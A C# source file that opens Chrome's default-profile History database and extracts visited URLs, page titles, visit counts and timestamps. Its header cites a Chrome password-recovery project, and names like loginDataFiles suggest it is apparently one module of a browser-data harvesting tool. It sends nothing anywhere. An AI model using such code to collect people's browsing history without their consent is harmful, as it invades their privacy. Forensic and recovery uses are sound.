using SQL_Helper;
using System;
using System.Collections.Generic;
using System.IO;
/* 

|| AUTHOR Arsium ||
|| github : https://github.com/arsium       || 

Sources : https://github.com/0xfd3/Chrome-Password-Recovery
Date of Chrome : https://social.msdn.microsoft.com/Forums/vstudio/en-US/6bb627dc-83d6-4272-933f-329fb63d295a/parsing-dates-and-times?forum=vbgeneral
 
This dll is my own researches about getting chrome history logs , you can add by yourself others chromium-based web browsers !
 */
namespace History
{
    public class History
    {
        public string ID { get; set; }

        public string URL { get; set; }

        public string Title { get; set; }

        public string visit_count { get; set; }

        public string typed_count { get; set; }

        public string last_visit_Time { get; set; }

        public string hidden { get; set; }
    }

    public class History_Log
    {
        public static string LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static string defaultPath = LocalApplicationData + @"\Google\Chrome\User Data" + @"\Default\History";

        public static DateTime GetDateFromWebkitTime(string s)
        {
            // Ref: http://linuxsleuthing.blogspot.co.uk/2011/06/decoding-google-chrome-timestamps-in.html
            // https://social.msdn.microsoft.com/Forums/vstudio/en-US/6bb627dc-83d6-4272-933f-329fb63d295a/parsing-dates-and-times?forum=vbgeneral
            var secsFromEpoch = Convert.ToDouble(s) * 0.000001;
            var epoch = new DateTime(1601, 1, 1);

            return epoch.Add(TimeSpan.FromSeconds(secsFromEpoch));
        }

        public static List<History> Accounts()//string path, string browser, string table = "urls")
        {

            //Get all created profiles from browser path
         List<string> loginDataFiles =new List<string>();
            loginDataFiles.Add(defaultPath);

            List<History> data = new List<History>();

            foreach (string loginFile in loginDataFiles.ToArray())
            {
                if (!File.Exists(loginFile))
                    continue;

                SQLiteHandler SQLDatabase;

                try
                {
                    SQLDatabase = new SQLiteHandler(loginFile); //Open database with Sqlite
                }
                catch (System.Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                    continue;
                }

                if (!SQLDatabase.ReadTable("urls"))
                    continue;

                for (int I = 0; I <= SQLDatabase.GetRowCount() - 1; I++)
                {
                    try
                    {
                        //Get values with row number and column name
                        string ID = SQLDatabase.GetValue(I, "id");
                        string host = SQLDatabase.GetValue(I, "url");
                        string Title = SQLDatabase.GetValue(I, "title");
                        string visit_count = SQLDatabase.GetValue(I, "visit_count");
                        string typed_count = SQLDatabase.GetValue(I, "typed_count");
                        string last_visit_Time = GetDateFromWebkitTime(SQLDatabase.GetValue(I, "last_visit_Time")).ToLocalTime().ToString();
                        //
                        //
                        if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(Title))
                            data.Add(new History() { ID = ID, URL = host, Title = System.Text.Encoding.UTF8.GetString(System.Text.Encoding.Default.GetBytes(Title)), visit_count = visit_count , typed_count = typed_count , last_visit_Time = last_visit_Time }); ;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }
                }
            }

            return data;
        }
    }
}
